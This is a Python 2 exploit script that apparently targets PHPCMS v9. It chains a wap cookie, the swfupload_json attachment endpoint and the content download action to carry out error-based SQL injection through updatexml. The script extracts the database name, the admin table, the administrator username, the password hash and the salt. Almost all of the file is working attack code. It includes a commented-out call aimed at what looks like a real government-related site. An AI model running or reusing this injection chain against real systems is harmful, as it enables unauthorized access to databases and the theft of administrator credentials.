# coding:utf-8

from urlparse import urlparse
# coding:utf-8
import requests
import re
from urllib import quote
TIMEOUT = 3

"""
在main函数中修改URL
"""

payloads = {
    0: "select id from tester",
    1: "select TABLE_NAME from information_schema.tables where table_schema={inject} and TABLE_NAME like 0x2561646D696E25 limit 1",
    2: "select username from {inject} where userid=1",
    3: "select substr(password,1,16) from {inject} where userid=1",
    4: "select substr(password,16,17) from {inject} where userid=1",
    5: "select encrypt from {inject} where userid=1",
}

def poc(url, Inject):
    # id=1 and updatexml(1,concat(1,((select level from v9_badword where level=1))),1)
    payload = "&id=%*27 and updatexml(1,concat(0x7e,(({})),0x7e),1)%23&modelid=1&catid=1&m=1&f=".format(Inject)

    cookies = {}
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False

    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            break
    else:
        return False

    setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
    return r.content

def GetDb(string):
    m = re.search(r"Table '(\S+)\.tester' doesn't exist", string)
    if m:
        return m.group(1)

def GetTable(string):
    m = re.search(r"XPATH syntax error: '~(\S+)~'", string)
    if m:
        return m.group(1)

def GetUsername(string):
    m = re.search(r"XPATH syntax error: '~(\S+)~'", string)
    if m:
        return m.group(1)

def GetPassword(string):
    m = re.search(r"XPATH syntax error: '~(\S+)~'", string)
    if m:
        return m.group(1)

def read(url):

    url = url = url.split("->")[0]

    ret = poc(url, payloads.get(0))
    getdb = GetDb(ret)
    if getdb:
        print "GET DATABASE {} !".format(getdb)
        table = getdb.encode('hex').upper()

        ret2 = poc(url, payloads.get(1).format(inject="0x"+table))

        gettable = GetTable(ret2)
        #print gettable
        if gettable:
            print "GET TABLE {} !".format(gettable)
            # pre = gettable.split("_")[0]
            ret3 = poc(url, payloads.get(2).format(inject=gettable))
            username = GetUsername(ret3)
            if username:
                print "GET USERNAME: {}".format(username)

            ret4 = poc(url, payloads.get(3).format(inject=gettable))
            password = GetPassword(ret4)

            ret5 = poc(url, payloads.get(4).format(inject=gettable))
            passwordlast = GetUsername(ret5)
            if passwordlast and password and password[-1]==passwordlast[0]:
                print "GET PASSWORD: {}".format(password[:-1]+passwordlast)

            ret6 = poc(url, payloads.get(5).format(inject=gettable))
            encrypt = GetPassword(ret6)
            if encrypt:
                print "GET ENCRYPT: {}".format(encrypt)
                return "{}->{}|{}:{}".format(url,username,password[:-1]+passwordlast,encrypt)

# print read("http://www.fjngd.org.cn")

class Exploit:

    def attack(self, url):
        try:
            s = read(url)
            if s:
                return s
        except Exception,e:
            print e
            pass

def main():
    # 设置URL
    url = "url"

    exp = Exploit()
    exp.attack(url)

if __name__ == '__main__':
    main()
